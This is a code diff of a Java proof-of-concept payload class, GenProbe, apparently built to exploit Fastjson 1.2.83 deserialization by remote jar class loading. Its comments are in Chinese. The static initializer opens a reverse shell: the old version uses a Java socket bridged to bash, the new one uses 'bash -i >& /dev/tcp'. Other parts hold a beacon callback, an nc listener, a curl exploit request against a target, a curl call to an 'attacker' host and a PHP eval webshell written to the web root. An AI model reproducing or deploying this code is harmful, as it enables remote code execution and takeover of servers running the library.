@@ -6,11 +6,12 @@
  *   2. 静态初始化块 <clinit> - 在类定义阶段自动执行，无需实例化
  *   3. 默认行为: 反弹 shell 到 127.0.0.1:4444
  *
- * 编译方式:
- *   javac -cp fastjson-1.2.83.jar GenProbe.java
+ * 构建方式:
+ *   python3 serve.py --build-only --force-build --cb-host 127.0.0.1 --cb-port 4444
  *
- * 打包方式:
- *   jar cf probe.jar com/alibaba/fastjson/poc/GenProbe.class
+ * 注意:
+ *   serve.py 会修补 class 内部名，使其与 payload 的 @type 匹配。
+ *   不要手工 javac + jar 生成 probe，否则只能触发 /probe 下载，无法执行 <clinit>。
  *
  * 使用方式:
  *   # 终端 1: 启动 nc 监听
@@ -21,7 +22,7 @@
  *
  *   # 终端 3: 发送 payload
  *   curl -X POST -H 'Content-Type: application/json' \
- *     --data '{"@type":"jar:http:..2130706433:19090.probe!.GenProbe","x":1}' \
+ *     --data '{"@type":"jar:http:..3232235777:19090.probe!.GenProbe"}' \
  *     http://target:18080/parse
  */
 
@@ -34,70 +35,28 @@ public class GenProbe {
 
     // <clinit> 静态初始化块 - 在类定义阶段自动执行
     static {
-        /*
-         * 默认: 反弹 shell 到 127.0.0.1:4444
-         * 使用方式: nc -lvnp 4444
-         */
-        revShell("127.0.0.1", 4444);
+        // 1. HTTP 回调验证 - 确认类被成功加载
+        httpGet("http://127.0.0.1:19090/beacon");
 
-        /* ---- 其他利用方式（注释掉，按需启用） ---- */
+        // 2. 标准 bash 反弹 shell
+        //    使用 bash -i >& /dev/tcp/IP/PORT 0>&1 标准方式
+        bashRevShell("127.0.0.1", 4444);
 
-        // 创建标记文件（用于本地验证，无害）
-        // touch("/tmp/GenProbe.flag");
-
-        // 执行命令
-        // exec("curl http://attacker:8080/beacon");
-
-        // 写入 WebShell
-        // writeFile("/var/www/html/shell.php", "<?php @eval($_POST['c']);?>");
     }
 
-    /** 反弹 shell */
-    static void revShell(String host, int port) {
+    /** 标准 bash 反弹 shell - 使用 bash -i >& /dev/tcp/IP/PORT 0>&1 */
+    static void bashRevShell(String host, int port) {
         try {
-            java.net.Socket s = new java.net.Socket(host, port);
-            Process p = Runtime.getRuntime().exec("/bin/bash");
-            java.io.InputStream pIn = p.getInputStream();
-            java.io.InputStream pErr = p.getErrorStream();
-            java.io.OutputStream pOut = p.getOutputStream();
-            java.io.InputStream sIn = s.getInputStream();
-            java.io.OutputStream sOut = s.getOutputStream();
-
-            // Thread: bash stdout -> socket
-            new Thread(() -> {
-                try { byte[] b = new byte[4096]; int n;
-                    while ((n = pIn.read(b)) != -1) sOut.write(b, 0, n);
-                } catch (Exception ignored) {}
-            }).start();
-
-            // Thread: bash stderr -> socket
-            new Thread(() -> {
-                try { byte[] b = new byte[4096]; int n;
-                    while ((n = pErr.read(b)) != -1) sOut.write(b, 0, n);
-                } catch (Exception ignored) {}
-            }).start();
-
-            // Main thread: socket -> bash stdin
-            byte[] b = new byte[4096];
-            int n;
-            while ((n = sIn.read(b)) != -1) pOut.write(b, 0, n);
+            // 标准 bash 反弹 shell 命令
+            String cmd = "bash -i >& /dev/tcp/" + host + "/" + port + " 0>&1";
+            Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", cmd});
         } catch (Exception ignored) {}
     }
 
-    /** 创建标记文件 */
-    static void touch(String path) {
-        try { new java.io.File(path).createNewFile(); } catch (Exception ignored) {}
-    }
-
-    /** 执行命令 */
-    static void exec(String cmd) {
-        try { Runtime.getRuntime().exec(cmd); } catch (Exception ignored) {}
-    }
-
-    /** 写入文件 */
-    static void writeFile(String path, String content) {
+    /** HTTP 回调 - 用于验证类是否被成功加载 */
+    static void httpGet(String url) {
         try {
-            java.nio.file.Files.write(java.nio.file.Paths.get(path), content.getBytes());
+            new java.net.URL(url).openStream().close();
         } catch (Exception ignored) {}
     }
 }
